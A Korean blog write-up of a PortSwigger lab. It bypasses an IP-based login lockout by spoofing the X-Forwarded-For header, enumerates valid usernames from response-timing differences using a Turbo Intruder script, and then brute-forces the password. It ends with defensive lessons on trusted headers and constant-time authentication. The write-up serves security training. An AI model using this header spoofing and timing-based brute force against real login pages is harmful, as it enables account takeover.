+++
date = '2026-07-09T09:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Username enumeration via response timing'
summary = "IP 차단을 X-Forwarded-For로 우회하고, 유효 계정에서만 길어지는 응답 시간(TTFB)으로 username을 열거한 뒤 비밀번호를 브루트포스하는 Authentication 풀이"
toc = true
tags = ["Authentication", "Username Enumeration", "Response Timing", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)

> ![image.png](/writeup/portswigger/authentication/05/1.png)

이 랩은 **응답 시간**을 이용한 username 열거에 취약하다. 유효 계정을 찾아 비밀번호를 브루트포스하고 계정 페이지에 접근하면 문제가 해결된다. 실습 계정은 `wiener:peter`이며 [username 후보](https://portswigger.net/web-security/authentication/auth-lab-usernames)와 [password 후보](https://portswigger.net/web-security/authentication/auth-lab-passwords)가 주어진다.

### Authentication 진단

먼저 유효·무효 계정의 응답을 비교하면 메시지·길이가 **완벽하게 동일**하다. 메시지로는 열거가 불가능하다.

또한 여러 번 실패하면 `You have made too many incorrect login attempts. Please try again in 30 minute(s).`가 반환되며 시도가 차단된다. 세션을 바꿔도 동일하게 막히는 것으로 보아 IP 기반 차단이다. `X-Forwarded-For` 헤더로 우회를 시도한다.

```http
POST /login HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 1.1.1.1

username=x&password=x
```

`X-Forwarded-For`를 추가하니 다시 `Invalid username or password.` 응답이 돌아온다 — 서버가 이 헤더를 클라이언트 IP로 신뢰하므로, 값을 매 요청 바꾸면 차단을 회피할 수 있다.

이제 문제의 조건인 응답 시간을 관찰한다. 유효 계정에 **충분히 긴 비밀번호**를 넣으면, 서버가 그 비밀번호를 실제로 해싱·검증하느라 응답이 눈에 띄게 지연된다. 무효 계정은 검증 단계에 도달하기 전에 반환되므로 지연이 없다. 즉 "긴 비밀번호 + 유효 계정"일 때만 응답 시간이 길어진다.

---

## 익스플로잇

비밀번호를 충분히 길게 고정하고, `X-Forwarded-For`를 매 요청 바꿔 가며 username 후보 전체를 보낸다. Turbo Intruder 스크립트는 다음과 같다.

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=2,
                           requestsPerConnection=50,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=3
                           )
    i=0
    for word in open(r'C:\Users\cas\Desktop\CAS\asset\word.txt'):
        engine.queue(target.req, [str(i), word.rstrip()])
        i+=1

def handleResponse(req, interesting):
    table.add(req)
```

`X-Forwarded-For`에 증가하는 `i`를 넣어 매 요청 다른 IP로 위장하고, username 자리에 후보를 대입한다. 결과의 TTFB(Time To First Byte)를 보면 `arcsight` 계정에서만 눈에 띄게 긴 시간이 소요된다.

![image.png](/writeup/portswigger/authentication/05/2.png)

유효 계정 `arcsight`를 특정했으니, 이제 username을 고정하고 password 자리에 후보를 대입해 같은 방식으로 브루트포스한다. `buster`에서 302 응답이 돌아온다.

![image.png](/writeup/portswigger/authentication/05/3.png)

확인한 `arcsight:buster`로 로그인하면 문제가 해결된다.

![image.png](/writeup/portswigger/authentication/05/4.png)

---

## 정리

이 랩은 열거 신호가 메시지가 아니라 **시간**이라는 점이 핵심이다. 서버는 응답 본문을 동일하게 맞췄지만, 처리 경로의 길이까지는 숨기지 못했다. 유효 계정은 "비밀번호 해시 검증"이라는 비싼 연산을 거치고 무효 계정은 그 전에 빠져나오므로, 그 연산 시간의 차이가 곧 계정 존재 여부를 드러낸다. 비밀번호를 길게 줄수록 해싱 비용이 커져 차이가 뚜렷해진다.

여기엔 두 개의 방어가 동시에 무너졌다. 하나는 IP 기반 rate limit이 `X-Forwarded-For`를 신뢰해 우회된 것이고, 다른 하나는 타이밍 사이드 채널이 남은 것이다. 첫째는 클라이언트가 통제하는 헤더를 신뢰 근거로 삼은 전형적 실수다. 둘째의 방어는 인증 처리 시간을 계정 존재 여부와 무관하게 상수로 맞추는 것 — 무효 계정에도 더미 해시 검증을 수행하거나, 요청을 일정 시간에 맞춰 반환한다.

진단에서 남는 습관은, 메시지·길이가 동일해도 **응답 시간을 하나의 채널로 본다**는 것이다. Turbo Intruder는 TTFB를 열로 제공하므로 정렬만으로 이상치를 찾을 수 있다. IP 차단 우회와 rate limit의 다른 결함은 [broken brute-force protection, IP block](/write-up/portswigger/authentication/write-up-portswigger---broken-brute-force-protection-ip-block/)에서 이어 다룬다.
